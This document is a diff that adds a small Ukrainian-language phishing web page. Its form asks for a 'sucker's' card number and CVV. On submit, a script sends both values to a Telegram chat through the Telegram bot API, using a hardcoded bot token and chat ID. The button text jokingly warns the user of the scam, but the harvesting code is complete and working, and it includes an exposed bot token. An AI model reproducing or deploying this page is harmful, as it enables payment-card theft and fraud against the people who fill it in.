@@ -1,0 +1,47 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Задня парта</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">  </head>
+  <body>
+    <h1>Чіііііііікс</h1>
+        <div class="container mt-5 pt-5 pb-5">
+            <div class="col-md-6 offset-md-3">
+               <form id="tg">
+                   <div class="form-group">
+                       <label class="form-label">карта лоха</label>
+                        <input type="text" name="card" class="form-control">
+                   </div>
+                   <div class="form-group">
+                       <label class="form-labe1">3 цифри</label>
+                        <input type="text" name="cvv" class="form-control">
+                    </div>
+                   <button type="submit" class="btn btn-primary mt-4">Не нажимай дура тебе заскамлять</button>
+               </form>
+           </div>
+       </div>
+       <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+       <script>
+        const TOKEN = "5704147870:AAEgIrTfyQw6GLmGSEKBucjv3AxS1zfDLSs";
+        const CHAT_ID = "-1001792840014";
+        const URI_API = `https://api.telegram.org/bot${ TOKEN }/sendMessage`;
+        
+        document.getElementById('tg').addEventListener('submit', function(e) {
+           e.preventDefault();
+            
+           let message = `<b>Новий лох!!!</b>\n`;
+           message += `<b>Карта: </b> ${ this.card.value }\n`;
+           message += `<b>Код: </b> ${ this.cvv.value }`;
+           
+           axios.post(URI_API, {
+                chat_id: CHAT_ID,
+                parse_mode: 'html',
+                text: message
+           })
+        })
+   </script>
+   
+  </body>
+</html>
